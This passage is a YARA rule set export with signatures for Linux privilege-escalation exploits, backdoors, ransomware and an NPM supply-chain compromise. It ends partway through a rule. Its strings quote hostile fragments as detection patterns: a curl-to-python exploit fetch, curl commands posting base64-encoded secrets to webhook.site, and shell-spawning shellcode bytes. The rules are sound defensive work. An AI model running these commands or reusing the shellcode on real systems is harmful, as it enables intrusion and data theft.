/*
    VALHALLA YARA RULE SET - DEMO
    Retrieved: 2026-06-27 20:50
    Generated for User: demo
    Number of Rules: 2797
    Warning:
        Note that the full rule set contains rules that require modules and threat hunting
        rules with low scores (< 60) that could lead to false positives - use the Python
        module valhallaAPI to retrieve a filtered set

    This is the VALHALLA demo rule set. The content represents the 'signature-base' repository
    in a streamlined format but lacks the rules provided by 3rd parties.
    All rules are licensed under CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/.
*/


rule EXPL_LNX_DirtyFrag_ForensicArtefacts_May26_RID36A9 : DEMO EXPLOIT LINUX {
   meta:
      description = "Detects DirtyFrag exploit code POC usage in Linux environments"
      author = "Florian Roth"
      reference = "https://github.com/V4bel/dirtyfrag/tree/master"
      date = "2026-05-08 17:05:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXPLOIT, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $xa1 = "/V4bel/dirtyfrag.git" ascii
      $xa2 = "static const uint8_t shell_elf[PAYLOAD_LEN] = {" ascii
      $xa3 = "/usr/bin/su page-cache patched (entry 0x%x = shellcode)" ascii
   condition: 
      filesize < 800KB and 1 of ( $xa* )
}

rule EXPL_LNX_DirtyFragLPE_May26_RID3055 : DEMO EXPLOIT FILE LINUX T1068 {
   meta:
      description = "Detects dirtyfrag, a local privilege escalation exploit for Linux."
      author = "Pezier Pierre-Henri"
      reference = "https://github.com/V4bel/dirtyfrag/tree/master"
      date = "2026-05-07 12:35:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXPLOIT, FILE, LINUX, T1068"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "gained CAP_NET_RAW within netn" ascii
      $x2 = "DIRTYFRAG_VERBOSE" ascii
      $s1 = { 15 7C 4A 7F B9 79 37 9E } 
      $s2 = "/proc/self/setgroups" ascii fullword
      $s3 = "pcbc(fcrypt)" ascii fullword
      $s4 = { 17 bb c7 f3 3f 36 ba 71 8e 97 65 60 69 b6 f6 e6 } 
   condition: 
      filesize < 100KB and uint32be ( 0 ) == 0x7f454c46 and ( 1 of ( $x* ) or 3 of ( $s* ) )
}

rule EXPL_HKTL_LNX_DirtyFragShellcode_May26_RID3499 : DEMO EXPLOIT HKTL LINUX T1068 {
   meta:
      description = "Detects a shellcode observed in dirtyfrag, a local privilege escalation exploit for Linux."
      author = "Pezier Pierre-Henri"
      reference = "https://github.com/V4bel/dirtyfrag/tree/master"
      date = "2026-05-07 15:37:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXPLOIT, HKTL, LINUX, T1068"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 31 ff 31 f6 31 c0 b0 6a 0f 05 b0 69 0f 05 b0 74 0f 05 6a 00 48 [6] 50 48 89 e2 48 [6] 31 f6 6a 3b 58 0f 05 } 
   condition: 
      $op1
}

rule EXPL_LNX_Copy_Fail_Artefacts_CVE_2026_31431_Apr26_RID3717 : CVE_2026_31431 DEMO EXPLOIT LINUX SCRIPT T1059_006 T1087_001 {
   meta:
      description = "Detects forensic artifacts related to public Copy Fail (CVE-2026-31431) exploit PoCs, including known tiny ELF shell payloads, Python exploit code fragments, AF_ALG/authencesn/splice usage patterns, public PoC URLs, and other indicators observed in online proof-of-concept material."
      author = "Florian Roth"
      reference = "https://copy.fail"
      date = "2026-04-30 17:23:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2026_31431, DEMO, EXPLOIT, LINUX, SCRIPT, T1059_006, T1087_001"
      minimum_yara = "4.0.0"
      
   strings:
      $xn1 = "curl https://copy.fail/exp" ascii
      $xs1 = "| python3 && su" 
      $xs2 = "g.open(\"/usr/bin/su\",0);i=0;" 
      $xs3 = "[-] page-cache mutation failed" 
      $xs4 = "[+] /etc/passwd page cache mutated" 
      $xs5 = "bind(AF_ALG: authencesn(hmac(sha256),cbc(aes)))" 
      $xs6 = "/tmp/.cve_test" 
      $sa1 = "authencesn(hmac(sha256),cbc(aes))" ascii
      $sb1 = { 08 00 01 00 00 00 00 10 } 
      $sb2 = "0800010000000010" ascii
      $xe1 = "authencesn(hmac(sha256),cbc(aes))" base64
      $xc1 = { 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 02 00 3e 00 01 00 00 00 78 00 40 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 38 00 01 00 00 00 00 00 00 00 01 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 00 00 00 00 40 00 00 00 00 00 00 9e 00 00 00 00 00 00 00 9e 00 00 00 00 00 00 00 00 10 00 00 00 00 00 00 31 c0 31 ff b0 69 0f 05 48 8d 3d 0f 00 00 00 31 f6 6a 3b 58 99 0f 05 31 ff 6a 3c 58 0f 05 2f 62 69 6e 2f 73 68 00 00 00 } 
      $xc2 = { 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 02 00 b7 00 01 00 00 00 78 00 40 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 38 00 01 00 00 00 00 00 00 00 01 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 ac 00 00 00 00 00 00 00 ac 00 00 00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00 80 d2 48 12 80 d2 01 00 00 d4 00 01 00 10 01 00 80 d2 02 00 80 d2 a8 1b 80 d2 01 00 00 d4 00 00 80 d2 a8 0b 80 d2 01 00 00 d4 2f 62 69 6e 2f 73 68 00 } 
      $xg1 = "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c00111d10d3" 
      $xg2 = "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40b806c80461569098000383e101c3db1bae9e6d303c1090a1af5f9c91a19f9499d7f93820b8f361e7a10ddc4089db598c11671b0038b31858" 
      $xg3 = "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca5b039787e96cb8e421d47009c8bb0214126004f29980788534540cc4e686b0f59332f3f48b3318003ff61578" 
      $xg4 = "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e02e5c1680601086578c0f0ff864c7e568fee1a1501c36f59d61133f9590dff67d944f0b3020082b00eaf" 
      $xg5 = "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40381fc80461569098000383e101c3db1bae9e6de88e51e1303c99c51d31f36c83e1ed2cc688b30d001bf41180" 
      $xg6 = "789cab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd04ca5b029787e96cb8e421d47009c8bbf280dbe1272390cf04c42ba4216220f915dc103600d72b1509" 
      $xge1 = { 78 9c ab 77 f5 71 63 62 64 64 80 01 26 06 3b 06 10 af 82 c1 01 cc 77 60 c0 04 0e 0c 16 0c 30 1d 20 9a 15 4d 16 99 9e 07 e5 c1 68 06 01 08 65 78 c0 f0 ff 86 4c 7e 56 8f 5e 5b 7e 10 f7 5b 96 75 c4 4c 7e 56 c3 ff 59 36 11 fc ac fa 49 99 79 fa c5 19 0c 00 11 1d 10 d3 } 
      $xge2 = { 78 9c ab 77 f5 71 63 64 64 64 80 01 26 06 66 06 10 2f a4 81 85 c3 84 01 01 4c 18 14 18 60 aa e0 aa 81 6a 40 b8 06 c8 04 61 56 90 98 00 03 83 e1 01 c3 db 1b ae 9e 6d 30 3c 10 90 a1 af 5f 9c 91 a1 9f 94 99 d7 f9 38 20 b8 f3 61 e7 a1 0d dc 40 89 db 59 8c 11 67 1b 00 38 b3 18 58 } 
      $xge3 = { 78 da ab 77 f5 71 63 62 64 64 80 01 26 86 ed 0c 20 5e 05 83 03 98 ef c0 80 09 1c 18 2c 18 60 3a 40 34 2b 9a 2c 32 bd 06 ca 5b 03 97 87 e9 6c b8 e4 21 d4 70 09 c8 bb 02 14 12 60 04 f2 99 80 78 85 34 54 0c c4 e6 86 b0 f5 93 32 f3 f4 8b 33 18 00 3f f6 15 78 } 
      $xge4 = { 78 9c ab 77 f5 71 63 62 64 64 80 01 26 06 3b 06 10 af 82 c1 01 cc 77 60 c0 04 0e 0c 16 0c 30 1d 20 9a 15 4d 16 99 9e 02 e5 c1 68 06 01 08 65 78 c0 f0 ff 86 4c 7e 56 8f ee 1a 15 01 c3 6f 59 d6 11 33 f9 59 0d ff 67 d9 44 f0 b3 02 00 82 b0 0e af } 
      $xge5 = { 78 9c ab 77 f5 71 63 64 64 64 80 01 26 06 66 06 10 2f a4 81 85 c3 84 01 01 4c 18 14 18 60 aa e0 aa 81 6a 40 38 1f c8 04 61 56 90 98 00 03 83 e1 01 c3 db 1b ae 9e 6d e8 8e 51 e1 30 3c 99 c5 1d 31 f3 6c 83 e1 ed 2c c6 88 b3 0d 00 1b f4 11 80 } 
      $xge6 = { 78 9c ab 77 f5 71 63 62 64 64 80 01 26 86 ed 0c 20 5e 05 83 03 98 ef c0 80 09 1c 18 2c 18 60 3a 40 34 2b 9a 2c 32 bd 04 ca 5b 02 97 87 e9 6c b8 e4 21 d4 70 09 c8 bb f2 80 db e1 27 23 90 cf 04 c4 2b a4 21 62 20 f9 15 dc 10 36 00 d7 2b 15 09 } 
   condition: 
      1 of ( $x* ) or ( $sa1 and 1 of ( $sb* ) )
}

rule MAL_JS_NPM_SupplyChain_Compromise_Sep25_RID356B : DEMO FILE MAL T1059_007 {
   meta:
      description = "Detects a supply chain compromise in NPM packages (TinyColor, CrowdStrike etc.)"
      author = "Florian Roth"
      reference = "https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages"
      date = "2025-09-16 16:12:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, MAL, T1059_007"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "if (plat === \"linux\") return \"https://github.com/trufflesecurity/trufflehog/releases" 
      $sa1 = "curl -d \"$CONTENTS\" https://webhook.site/" ascii
      $sa2 = "curl -s -X POST -d \"$CONTENTS\" \"https://webhook.site/" 
      $sb1 = " | base64 -w 0 | " ascii
      $sb2 = " | base64 -w0)" 
   condition: 
      filesize < 20MB and ( 1 of ( $x* ) or ( 1 of ( $sa* ) and 1 of ( $sb* ) ) ) and not uint8 ( 0 ) == 0x7b
}

rule MAL_LNX_PLAGUE_BACKDOOR_Jul25_RID2FEE : DEMO FILE LINUX MAL {
   meta:
      description = "Detects Plague backdoor ELF binaries, related to PAM authentication alteration."
      author = "Pezier Pierre-Henri"
      reference = "Internal Research"
      date = "2025-07-25 12:18:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2025-09-17"
      tags = "DEMO, FILE, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "decrypt_phrase" 
      $s2 = "init_phrases" 
      $x1 = "captured_password" 
      $x2 = "updateklog" 
      $x3 = "init_cred_structs" 
      $xop1 = { 48 8b [4] 00 8b 00 3d ca b2 e9 f1 74 } 
   condition: 
      uint32be ( 0 ) == 0x7f454c46 and filesize < 1MB and 2 of them
}

rule MAL_ELF_Xlogin_Nov24_1_RID2E79 : DEMO FILE LINUX MAL {
   meta:
      description = "Detects xlogin backdoor samples"
      author = "Florian Roth"
      reference = "https://blog.sekoia.io/solving-the-7777-botnet-enigma-a-cybersecurity-quest/"
      date = "2024-11-11 11:16:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2b09a6811a9d0447f8c6480430eb0f7e3ff64fa933d0b2e8cd6117f38382cc6a"
      hash2 = "d1cbf80786b1ca1ba2e5c31ec09159be276ad3d10fc0a8a0dbff229d8263ca0a"
      hash3 = "ff17e9bcc1ed16985713405b95745e47674ec98e3c6c889df797600718a35b2c"
      tags = "DEMO, FILE, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $xc1 = { 6C 6F 67 69 6E 3A 00 25 73 00 00 2F 62 69 6E 2F 73 68 00 2F 74 6D 70 2F 6C 6F 67 69 6E } 
      $s1 = "/tmp/login" ascii fullword
      $s2 = "npxXoudifFeEgGaACSnmcs[" ascii fullword
      $sc1 = { 28 6E 69 6C 29 00 00 00 28 6E 75 6C 6C 29 } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 500KB and ( 1 of ( $x* ) or 2 of them )
}

rule MAL_LNX_Perfctl_Oct24_RID2E56 : DEMO FILE LINUX MAL {
   meta:
      description = "Detects Perfctl malware samples"
      author = "Florian Roth"
      reference = "https://www.aquasec.com/blog/perfctl-a-stealthy-malware-targeting-millions-of-linux-servers/"
      date = "2024-10-09 11:10:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a6d3c6b6359ae660d855f978057aab1115b418ed277bb9047cd488f9c7850747"
      hash2 = "ca3f246d635bfa560f6c839111be554a14735513e90b3e6784bedfe1930bdfd6"
      tags = "DEMO, FILE, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 83 45 f8 01 8b 45 f8 48 3b 45 98 0f 82 1b ff ff ff 90 c9 c3 55 } 
      $op2 = { 48 8b 55 a0 48 01 ca 0f b6 0a 48 8b 55 a8 89 c0 88 4c 02 18 8b 45 fc 83 e0 3f } 
      $op3 = { 88 4c 10 58 83 45 f8 01 83 7d f8 03 0f 86 68 ff ff ff 90 c9 c3 55 } 
      $op4 = { 48 83 ec 68 48 89 7d a8 48 89 75 a0 48 89 55 98 48 8b 45 a8 48 8b 00 83 e0 3f 89 45 fc } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 300KB and 2 of them
}

rule BCKDR_XZUtil_Binary_CVE_2024_3094_Mar24_1_RID33F2 : CVE_2024_3094 DEMO FILE {
   meta:
      description = "Detects injected code used by the backdoored XZ library (xzutil) CVE-2024-3094."
      author = "Florian Roth"
      reference = "https://www.openwall.com/lists/oss-security/2024/03/29/4"
      date = "2024-03-30 15:09:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "319feb5a9cddd81955d915b5632b4a5f8f9080281fb46e2f6d69d53f693c23ae"
      hash2 = "605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4"
      hash3 = "8fa641c454c3e0f76de73b7cc3446096b9c8b9d33d406d38b8ac76090b0344fd"
      tags = "CVE_2024_3094, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 48 8d 7c 24 08 f3 ab 48 8d 44 24 08 48 89 d1 4c 89 c7 48 89 c2 e8 ?? ?? ?? ?? 89 c2 } 
      $op2 = { 31 c0 49 89 ff b9 16 00 00 00 4d 89 c5 48 8d 7c 24 48 4d 89 ce f3 ab 48 8d 44 24 48 } 
      $op3 = { 4d 8b 6c 24 08 45 8b 3c 24 4c 8b 63 10 89 85 78 f1 ff ff 31 c0 83 bd 78 f1 ff ff 00 f3 ab 79 07 } 
      $xc1 = { F3 0F 1E FA 55 48 89 F5 4C 89 CE 53 89 FB 81 E7 00 00 00 80 48 83 EC 28 48 89 54 24 18 48 89 4C 24 10 } 
   condition: 
      uint16 ( 0 ) == 0x457f and ( all of ( $op* ) or $xc1 )
}

rule MAL_LNX_CamaroDragon_Sheel_Oct23_RID3283 : DEMO G0129 LINUX MAL {
   meta:
      description = "Detects CamaroDragon's tool named sheel"
      author = "Florian Roth"
      reference = "https://research.checkpoint.com/2023/the-dragon-who-sold-his-camaro-analyzing-custom-router-implant/"
      date = "2023-10-06 14:08:21"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7985f992dcc6fcce76ee2892700c8538af075bd991625156bf2482dbfebd5a5a"
      tags = "DEMO, G0129, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "-h server_ip -p server_port -i update_index[0-4] [-r]" ascii fullword
      $s1 = "read_ip" ascii fullword
      $s2 = "open fail.%m" ascii fullword
      $s3 = "ri:h:p:" ascii fullword
      $s4 = "update server list success!" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 30KB and ( 1 of ( $x* ) or 3 of them ) or 4 of them
}

rule MAL_WAR_Ivanti_EPMM_MobileIron_Mi_War_Aug23_RID365A : CVE_2023_35078 DEMO FILE MAL {
   meta:
      description = "Detects WAR file found in the Ivanti EPMM / MobileIron Core compromises exploiting CVE-2023-35078"
      author = "Florian Roth"
      reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-213a"
      date = "2023-08-01 16:52:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6255c75e2e52d779da39367e7a7d4b8d1b3c9c61321361952dcc05819251a127"
      tags = "CVE_2023_35078, DEMO, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "logsPaths.txt" ascii fullword
      $s2 = "keywords.txtFirefox" ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 20KB and all of them
}

rule APT_MAL_UNC4841_SEASPY_Jun23_1_RID2FFA : APT CVE_2023_2868 DEMO MAL {
   meta:
      description = "Detects SEASPY malware used by UNC4841 in attacks against Barracuda ESG appliances exploiting CVE-2023-2868"
      author = "Florian Roth"
      reference = "https://blog.talosintelligence.com/alchimist-offensive-framework/"
      date = "2023-06-16 12:20:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3f26a13f023ad0dcd7f2aa4e7771bba74910ee227b4b36ff72edc5f07336f115"
      tags = "APT, CVE_2023_2868, DEMO, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $sx1 = "usage: ./BarracudaMailService <Network-Interface>. e.g.: ./BarracudaMailService eth0" ascii fullword
      $s1 = "fcntl.tmp.amd64." ascii
      $s2 = "Child process id:%d" ascii fullword
      $s3 = "[*]Success!" ascii fullword
      $s4 = "NO port code" ascii
      $s5 = "enter open tty shell" ascii
      $op1 = { 48 89 c6 f3 a6 0f 84 f7 01 00 00 bf 6c 84 5f 00 b9 05 00 00 00 48 89 c6 f3 a6 0f 84 6a 01 00 00 } 
      $op2 = { f3 a6 0f 84 d2 00 00 00 48 89 de bf 51 5e 61 00 b9 05 00 00 00 f3 a6 74 21 48 89 de } 
      $op3 = { 72 de 45 89 f4 e9 b8 f4 ff ff 48 8b 73 08 45 85 e4 ba 49 3d 62 00 b8 44 81 62 00 48 0f 45 d0 } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 9000KB and 3 of them or 5 of them
}

rule HKTL_EXPL_POC_LibSSH_Auth_Bypass_CVE_2023_2283_Jun23_1_RID3855 : CVE_2023_2283 DEMO EXPLOIT FILE HKTL {
   meta:
      description = "Detects POC code used in attacks against libssh vulnerability CVE-2023-2283"
      author = "Florian Roth"
      reference = "https://github.com/github/securitylab/tree/1786eaae7f90d87ce633c46bbaa0691d2f9bf449/SecurityExploits/libssh/pubkey-auth-bypass-CVE-2023-2283"
      date = "2023-06-08 18:16:41"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2023_2283, DEMO, EXPLOIT, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "nprocs = %d" ascii fullword
      $s2 = "fork failed: %s" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x457f and all of them
}

rule MAL_ELF_ReverseShell_SSLShell_Jun23_1_RID341E : CVE_2023_2868 DEMO FILE LINUX MAL SCRIPT {
   meta:
      description = "Detects a reverse shell named SSLShell used in Barracuda ESG exploitation (CVE-2023-2868)"
      author = "Florian Roth"
      reference = "https://www.barracuda.com/company/legal/esg-vulnerability"
      date = "2023-06-07 15:16:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8849a3273e0362c45b4928375d196714224ec22cb1d2df5d029bf57349860347"
      tags = "CVE_2023_2868, DEMO, FILE, LINUX, MAL, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $sc1 = { 00 2D 63 00 2F 62 69 6E 2F 73 68 00 } 
      $s1 = "SSLShell" 
   condition: 
      uint32be ( 0 ) == 0x7f454c46 and uint16 ( 0x10 ) == 0x0002 and filesize < 5MB and all of them
}

rule MAL_ELF_SALTWATER_Jun23_1_RID2EB8 : CVE_2023_2868 DEMO LINUX MAL {
   meta:
      description = "Detects SALTWATER malware used in Barracuda ESG exploitations (CVE-2023-2868)"
      author = "Florian Roth"
      reference = "https://www.barracuda.com/company/legal/esg-vulnerability"
      date = "2023-06-07 11:26:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "601f44cc102ae5a113c0b5fe5d18350db8a24d780c0ff289880cc45de28e2b80"
      tags = "CVE_2023_2868, DEMO, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "libbindshell.so" 
      $s1 = "ShellChannel" 
      $s2 = "MyWriteAll" 
      $s3 = "CheckRemoteIp" 
      $s4 = "run_cmd" 
      $s5 = "DownloadByProxyChannel" 
      $s6 = "[-] error: popen failed" 
      $s7 = "/home/product/code/config/ssl_engine_cert.pem" 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 6000KB and ( ( 1 of ( $x* ) and 2 of them ) or 3 of them ) or all of them
}

rule MAL_RANSOM_ELF_ESXi_Attacks_Feb23_1_RID3293 : CRIME DEMO LINUX MAL RANSOM {
   meta:
      description = "Detects ransomware exploiting and encrypting ESXi servers"
      author = "Florian Roth"
      reference = "https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-14"
      date = "2023-02-04 14:11:01"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "11b1b2375d9d840912cfd1f0d0d04d93ed0cddb0ae4ddb550a5b62cd044d6b66"
      tags = "CRIME, DEMO, LINUX, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "usage: encrypt <public_key> <file_to_encrypt> [<enc_step>] [<enc_size>] [<file_size>]" ascii fullword
      $x2 = "[ %s ] - FAIL { Errno: %d }" ascii fullword
      $s1 = "lPEM_read_bio_RSAPrivateKey" ascii fullword
      $s2 = "lERR_get_error" ascii fullword
      $s3 = "get_pk_data: key file is empty!" ascii fullword
      $op1 = { 8b 45 a8 03 45 d0 89 45 d4 8b 45 a4 69 c0 07 53 65 54 89 45 a8 8b 45 a8 c1 c8 19 } 
      $op2 = { 48 89 95 40 fd ff ff 48 83 bd 40 fd ff ff 00 0f 85 2e 01 00 00 48 8b 9d 50 ff ff ff 48 89 9d 30 fd ff ff 48 83 bd 30 fd ff ff 00 78 13 f2 48 0f 2a 85 30 fd ff ff } 
      $op3 = { 31 55 b4 f7 55 b8 8b 4d ac 09 4d b8 8b 45 b8 31 45 bc c1 4d bc 13 c1 4d b4 1d } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 200KB and ( 1 of ( $x* ) or 3 of them ) or 4 of them
}

rule APT_MAL_LNX_RedMenshen_BPFDoor_Controller_May22_3_RID3892 : APT CHINA DEMO LINUX MAL {
   meta:
      description = "Detects BPFDoor implants used by Chinese actor Red Menshen"
      author = "Florian Roth"
      reference = "https://doublepulsar.com/bpfdoor-an-active-chinese-global-surveillance-tool-54b078f1a896"
      date = "2022-05-08 18:26:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "144526d30ae747982079d5d340d1ff116a7963aba2e3ed589e7ebc297ba0c1b3"
      hash2 = "fa0defdabd9fd43fe2ef1ec33574ea1af1290bd3d763fdb2bed443f2bd996d73"
      tags = "APT, CHINA, DEMO, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "hald-addon-acpi: listening on acpi kernel interface /proc/acpi/event" ascii fullword
      $s2 = "/sbin/mingetty /dev" ascii fullword
      $s3 = "pickup -l -t fifo -u" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 200KB and 2 of them or all of them
}

rule APT_MAL_LNX_RedMenshen_BPFDoor_Controller_May22_2_RID3891 : APT CHINA DEMO LINUX MAL {
   meta:
      description = "Detects BPFDoor implants used by Chinese actor Red Menshen"
      author = "Florian Roth"
      reference = "https://doublepulsar.com/bpfdoor-an-active-chinese-global-surveillance-tool-54b078f1a896"
      date = "2022-05-07 18:26:41"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "76bf736b25d5c9aaf6a84edd4e615796fffc338a893b49c120c0b4941ce37925"
      hash2 = "96e906128095dead57fdc9ce8688bb889166b67c9a1b8fdb93d7cff7f3836bb9"
      hash3 = "c80bd1c4a796b4d3944a097e96f384c85687daeedcdcf05cc885c8c9b279b09c"
      tags = "APT, CHINA, DEMO, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $opx1 = { 48 83 c0 0c 48 8b 95 e8 fe ff ff 48 83 c2 0c 8b 0a 8b 55 f0 01 ca 89 10 c9 } 
      $opx2 = { 48 01 45 e0 83 45 f4 01 8b 45 f4 3b 45 dc 7c cd c7 45 f4 00 00 00 00 eb 2? 48 8b 05 ?? ?? 20 00 } 
      $op1 = { 48 8d 14 c5 00 00 00 00 48 8b 45 d0 48 01 d0 48 8b 00 48 89 c7 e8 ?? ?? ff ff 48 83 c0 01 48 01 45 e0 } 
      $op2 = { 89 c2 8b 85 fc fe ff ff 01 c2 8b 45 f4 01 d0 2d 7b cf 10 2b 89 45 f4 c1 4d f4 10 } 
      $op3 = { e8 ?? d? ff ff 8b 45 f0 eb 12 8b 85 3c ff ff ff 89 c7 e8 ?? d? ff ff b8 ff ff ff ff c9 } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 100KB and 2 of ( $opx* ) or 4 of them
}

rule APT_MAL_LNX_RedMenshen_BPFDoor_Controller_May22_1_RID3890 : APT DEMO LINUX MAL T1070_003 {
   meta:
      description = "Detects unknown Linux implants (uploads from KR and MO)"
      author = "Florian Roth"
      reference = "https://doublepulsar.com/bpfdoor-an-active-chinese-global-surveillance-tool-54b078f1a896"
      date = "2022-05-05 18:26:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "07ecb1f2d9ffbd20a46cd36cd06b022db3cc8e45b1ecab62cd11f9ca7a26ab6d"
      hash2 = "4c5cf8f977fc7c368a8e095700a44be36c8332462c0b1e41bff03238b2bf2a2d"
      hash3 = "599ae527f10ddb4625687748b7d3734ee51673b664f2e5d0346e64f85e185683"
      tags = "APT, DEMO, LINUX, MAL, T1070_003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[-] Connect failed." ascii fullword
      $s2 = "export MYSQL_HISTFILE=" ascii fullword
      $s3 = "udpcmd" ascii fullword
      $s4 = "getshell" ascii fullword
      $op1 = { e8 ?? ff ff ff 80 45 ee 01 0f b6 45 ee 3b 45 d4 7c 04 c6 45 ee 00 80 45 ff 01 80 7d ff 00 } 
      $op2 = { 55 48 89 e5 48 83 ec 30 89 7d ec 48 89 75 e0 89 55 dc 83 7d dc 00 75 0? } 
      $op3 = { e8 a? fe ff ff 0f b6 45 f6 48 03 45 e8 0f b6 10 0f b6 45 f7 48 03 45 e8 0f b6 00 8d 04 02 } 
      $op4 = { c6 80 01 01 00 00 00 48 8b 45 c8 0f b6 90 01 01 00 00 48 8b 45 c8 88 90 00 01 00 00 c6 45 ef 00 0f b6 45 ef 88 45 ee } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 80KB and 2 of them or 5 of them
}

rule VULN_LNX_OMI_RCE_CVE_2021_386471_Sep21_RID320B : CVE_2021_38647 CVE_2021_386471 DEMO FILE LINUX VULN {
   meta:
      description = "Detects a Linux OMI version vulnerable to CVE-2021-38647 (OMIGOD) which enables an unauthenticated RCE"
      author = "Christian Burkard"
      reference = "https://www.wiz.io/blog/secret-agent-exposes-azure-customers-to-unauthorized-code-execution"
      date = "2021-09-16 13:48:21"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2021_38647, CVE_2021_386471, DEMO, FILE, LINUX, VULN"
      minimum_yara = "3.5.0"
      
   strings:
      $a1 = "/opt/omi/bin/omiagent" ascii fullword
      $s1 = "OMI-1.6.8-0 - " ascii
      $s2 = "OMI-1.6.6-0 - " ascii
      $s3 = "OMI-1.6.4-1 - " ascii
      $s4 = "OMI-1.6.4-0 - " ascii
      $s5 = "OMI-1.6.2-0 - " ascii
      $s6 = "OMI-1.6.1-0 - " ascii
      $s7 = "OMI-1.5.0-0 - " ascii
      $s8 = "OMI-1.4.4-0 - " ascii
      $s9 = "OMI-1.4.3-2 - " ascii
      $s10 = "OMI-1.4.3-1 - " ascii
      $s11 = "OMI-1.4.3-0 - " ascii
      $s12 = "OMI-1.4.2-5 - " ascii
